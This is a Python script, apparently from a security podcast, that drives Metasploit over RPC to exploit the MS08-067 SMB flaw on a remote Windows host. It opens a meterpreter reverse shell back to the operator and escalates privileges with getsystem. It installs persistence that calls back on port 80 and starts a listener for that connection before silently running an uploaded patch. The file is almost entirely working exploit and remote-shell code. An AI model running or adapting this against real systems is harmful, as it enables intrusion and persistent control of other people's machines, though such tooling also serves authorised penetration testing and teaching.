#################################################################################
#	msf.py - msf automation                                                 #
#	Copyrighted:  Primal Security Podcast - www.primalsecurity.net         	#
#									       	#
#    	This program is free software: you can redistribute it and/or modify	#
#    	it under the terms of the GNU General Public License as published by	#
#    	the Free Software Foundation, either version 3 of the License, or	#
#    	(at your option) any later version.					#
#										#
#    	This program is distributed in the hope that it will be useful,		#
#    	but WITHOUT ANY WARRANTY; without even the implied warranty of		#
#    	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the		#
#    	GNU General Public License for more details.				#
#										#
#    	You should have received a copy of the GNU General Public License	#
#    	along with this program.  If not, see <http://www.gnu.org/licenses/>.	#
#################################################################################

import os, msfrpc, optparse, sys, subprocess
from time import sleep


# Function to create the MSF .rc files
def builder(RHOST, LHOST, LPORT):
	post = open('/tmp/smbpost.rc', 'w')
	bat = open('/tmp/ms08067_install.bat', 'w')

	postcomms = """getsystem
run persistence -S -U -X -i 10 -p 80 -r """+LHOST+"""
cd c:\\
upload /tmp/ms08067_patch.exe c:\\
upload /tmp/ms08067_install.bat c:\\
execute -f ms08067_install.bat
"""
	batcomm = "ms08067_patch.exe /quiet"
	post.write(postcomms); bat.write(batcomm)
	post.close(); bat.close()

# Exploits the chain of rc files to exploit MS08-067, setup persistence, and patch
def sploiter(RHOST, LHOST, LPORT, session):
	client = msfrpc.Msfrpc({})
        client.login('msf', '123')
        ress = client.call('console.create')
        console_id = ress['id']

## Exploit MS08-067 ##
	commands = """use exploit/windows/smb/ms08_067_netapi
set PAYLOAD windows/meterpreter/reverse_tcp
set RHOST """+RHOST+"""
set LHOST """+LHOST+"""
set LPORT """+LPORT+"""
set ExitOnSession false
exploit -z
"""
	print "[+] Exploiting MS08-067 on: "+RHOST
	client.call('console.write',[console_id,commands])
	res = client.call('console.read',[console_id])
	result = res['data'].split('\n')

## Run Post-exploit script ##
	runPost = """use post/multi/gather/run_console_rc_file
set RESOURCE /tmp/smbpost.rc
set SESSION """+session+"""
exploit
"""
	print "[+] Running post-exploit script on: "+RHOST
	client.call('console.write',[console_id,runPost])
	rres = client.call('console.read',[console_id])
## Setup Listener for presistent connection back over port 80 ##
	sleep(10)
	listen = """use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 80
set LHOST """+LHOST+"""
exploit
"""
	print "[+] Setting up listener on: "+LHOST+":80"
	client.call('console.write',[console_id,listen])
	lres = client.call('console.read',[console_id])
	print lres


def main():
	parser = optparse.OptionParser(sys.argv[0] +\
        ' -p LPORT -r RHOST -l LHOST')
        parser.add_option('-p', dest='LPORT', type='string', \
        help ='specify a port to listen on')
        parser.add_option('-r', dest='RHOST', type='string', \
        help='Specify a remote host')
        parser.add_option('-l', dest='LHOST', type='string', \
        help='Specify a local host')
	parser.add_option('-s', dest='session', type='string', \
        help ='specify session ID')
	(options, args) = parser.parse_args()
	session=options.session
	RHOST=options.RHOST; LHOST=options.LHOST; LPORT=options.LPORT

	if (RHOST == None) and (LPORT == None) and (LHOST == None):
                print parser.usage
                sys.exit(0)

	builder(RHOST, LHOST, LPORT)
	sploiter(RHOST, LHOST, LPORT, session)


if __name__ == "__main__":
      main()
